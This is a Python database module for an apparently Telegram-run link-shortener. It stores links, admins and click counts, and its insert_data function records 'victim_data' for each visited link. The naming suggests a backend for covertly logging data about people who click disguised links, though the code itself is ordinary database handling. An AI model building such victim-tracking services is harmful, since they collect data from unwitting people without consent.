import psycopg2
from config import *
from psycopg2 import sql
from psycopg2.extras import Json

def insert_data(original_url, victim_data):
    conn = get_db_connection()
    cursor = conn.cursor()

    insert_query = """
        INSERT INTO information (original_url, victim_data)
        VALUES (%s, %s);
        """
    cursor.execute(insert_query, (original_url, Json(victim_data)))

    conn.commit()
    cursor.close()
    conn.close()



def get_db_connection():
    conn = psycopg2.connect(
        dbname=db_name,
        user=db_user,
        password=db_password,
        host=db_host,
        port=db_port
    )
    return conn



# Старт
def is_admin(user_id):
    try:
        with get_db_connection() as conn:
            with conn.cursor() as cursor:
                cursor.execute("SELECT 1 FROM admins WHERE id_telegram = %s LIMIT 1;", (user_id,))
                return cursor.fetchone() is not None
    except Exception as e:
        print(f"Error checking admin: {e}")
        return False

def check_admin(user_id):
    try:
        with get_db_connection() as conn:
            with conn.cursor() as cursor:
                cursor.execute("SELECT super_admin FROM admins WHERE id_telegram = %s LIMIT 1;", (user_id,))
                result = cursor.fetchone()
                if result and result[0] == 1:
                    return True
                return False
    except Exception as e:
        print(f"Error checking admin: {e}")
        return False



# Створити посилання
def get_id(id_telegram):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id_admin FROM admins WHERE id_telegram = %s", (id_telegram,))
    result = cursor.fetchone()
    cursor.close()
    conn.close()
    return result[0] if result else None

def save_link_to_db(name_link, original_link, short_link, domain_link, id_admin):
    conn = get_db_connection()
    cursor = conn.cursor()
    query = """
        INSERT INTO links (id_admin, name_link, original_link, short_link, domain_link)
        VALUES (%s, %s, %s, %s, %s)
    """
    cursor.execute(query, (id_admin, name_link, original_link, short_link, domain_link))
    conn.commit()
    cursor.close()
    conn.close()

def get_original_url(short_link):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT original_link FROM links WHERE short_link = %s", (short_link,))
    result = cursor.fetchone()
    cursor.close()
    conn.close()
    return result[0] if result else None

# Управління лінками
def get_links():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id_link, name_link, original_link FROM links")
    links = cursor.fetchall()
    conn.close()
    return links

def get_link_by_id(link_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT arch_status FROM links WHERE id_link = %s", (link_id,))
    result = cursor.fetchone()
    cursor.close()
    conn.close()
    return result

def update_link_arch_status(link_id, new_status):
    conn = get_db_connection()
    cursor = conn.cursor()
    query = "UPDATE links SET arch_status = %s WHERE id_link = %s"
    cursor.execute(query, (new_status, link_id))
    conn.commit()
    cursor.close()
    conn.close()

def delete_link(link_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM links WHERE id_link = %s", (link_id,))
    conn.commit()
    cursor.close()
    conn.close()



# Управління адмінами
def get_admins():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id_admin, admin_name, id_telegram, super_admin FROM admins")
    admins = cursor.fetchall()
    conn.close()
    return admins

def add_admin(admin_name, id_telegram, super_admin):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO admins (admin_name, id_telegram, super_admin) VALUES (%s, %s, %s)",
            (admin_name, id_telegram, super_admin)
        )
        conn.commit()
        conn.close()
        return True, None
    except Exception as e:
        return False, str(e)

def insert_data(original_url, victim_data):
    conn = get_db_connection()
    cursor = conn.cursor()

    insert_query = """
        INSERT INTO information (original_url, victim_data)
        VALUES (%s, %s);
        """
    cursor.execute(insert_query, (original_url, Json(victim_data)))

    conn.commit()
    cursor.close()
    conn.close()

def get_transition_count(original_url):
    conn = get_db_connection()
    cursor = conn.cursor()
    query = "SELECT COUNT(*) FROM information WHERE original_url = %s"
    cursor.execute(query, (original_url,))
    count = cursor.fetchone()[0]
    cursor.close()
    conn.close()
    return count